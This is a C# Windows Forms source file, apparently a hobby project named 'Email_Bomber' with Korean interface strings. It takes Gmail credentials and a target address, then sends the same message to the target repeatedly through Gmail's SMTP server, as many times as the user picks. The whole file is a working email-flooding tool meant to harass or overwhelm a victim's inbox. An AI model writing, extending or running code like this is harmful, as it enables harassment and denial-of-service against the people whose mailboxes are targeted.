using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Mail;

namespace Email_Bomber
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private c_beforeSendSet setter;
        private MailMessage mail = new MailMessage();
        private SmtpClient smtpServerGoogle = new SmtpClient("smtp.gmail.com");

        private void l_exit_Click(object sender, EventArgs e)
        {
            var exit = new f_exit();
            exit.Show();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            c_sendMailSet.SelectedIndex = 0;
            mail.SubjectEncoding = System.Text.Encoding.UTF8;
            mail.BodyEncoding = System.Text.Encoding.UTF8;
            c_howMany.SelectedIndex = 0;
        }

        private void b_setUser_Click(object sender, EventArgs e)
        {
            if (b_setUser.Text == "설정 확인")
            {
                if(t_sendName.Text == "" || c_sendMailSet.SelectedItem.ToString() == "" || t_targetName.Text == "" || t_targetMailSet.Text == "" || t_title.Text == "")
                {
                    MessageBox.Show("입력부터");
                    return;
                }
                b_setUser.Text = "설정 바꾸기";
                t_sendName.Enabled = false;
                c_sendMailSet.Enabled = false;

                t_siteId.Enabled = false;
                t_sitePass.Enabled = false;

                t_targetName.Enabled = false;
                t_targetMailSet.Enabled = false;

                t_title.Enabled = false;

                r_inputText.Enabled = false;
                c_howMany.Enabled = true;
                b_SEND.Enabled = true;
                setter = new c_beforeSendSet(t_sendName.Text, c_sendMailSet.SelectedItem.ToString(), t_targetName.Text, t_targetMailSet.Text, t_title.Text, r_inputText.Text);
                mail.From = new MailAddress(setter.get_sendName(), "포-k 격 7i", System.Text.Encoding.UTF8);
                mail.To.Add(setter.get_targetName());
                mail.Subject = setter.get_title();
                mail.Body = setter.get_includeString();
                if (c_sendMailSet.SelectedItem.ToString() == "@gmail")
                {
                    smtpServerGoogle.Port = 587;
                    try 
                    {
                        smtpServerGoogle.Credentials = new System.Net.NetworkCredential(t_siteId.Text, t_sitePass.Text);
                    }
                    catch(Exception ex)
                    {
                        MessageBox.Show(ex + "\n\n\n아이디 비번 확인, 설정도 확인하고");
                        return;
                    }
                    smtpServerGoogle.EnableSsl = true;
                    MessageBox.Show("설정 완료!");
                }
                
            }
            else
            {
                b_setUser.Text = "설정 확인";
                c_sendMailSet.Enabled = true;
                t_sendName.Enabled = true;

                t_siteId.Enabled = true;
                t_sitePass.Enabled = true;

                t_targetName.Enabled = true;
                t_targetMailSet.Enabled = true;

                t_title.Enabled = true;

                r_inputText.Enabled = true;
                c_howMany.Enabled = false;
                b_SEND.Enabled = false;
            }
        }

        private void b_SEND_Click(object sender, EventArgs e)
        {
            for (int num = 0; num < Convert.ToInt32(c_howMany.SelectedItem); num++)
            {
                smtpServerGoogle.Send(mail);
            }
            MessageBox.Show("전송완료");
        }
    }
}
